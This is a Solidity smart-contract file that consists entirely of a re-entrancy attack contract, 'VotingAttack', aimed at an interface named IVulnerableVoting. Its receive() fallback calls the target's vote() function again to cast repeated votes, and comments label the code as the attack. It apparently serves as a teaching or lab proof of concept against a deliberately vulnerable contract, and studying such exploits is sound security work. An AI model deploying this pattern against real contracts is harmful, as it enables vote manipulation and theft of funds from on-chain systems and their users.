// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IVulnerableVoting {
    function vote(uint256 candidateIndex) external;
}

contract VotingAttack {
    IVulnerableVoting public target;
    uint256 public attackCandidate;

    constructor(address _target) {
        target = IVulnerableVoting(_target);
    }

    function attack(uint256 candidateIndex) public {
        attackCandidate = candidateIndex;
        target.vote(candidateIndex); // Start re-entrancy attack
    }

    receive() external payable {
        target.vote(attackCandidate); // Re-enter voting function
    }
}
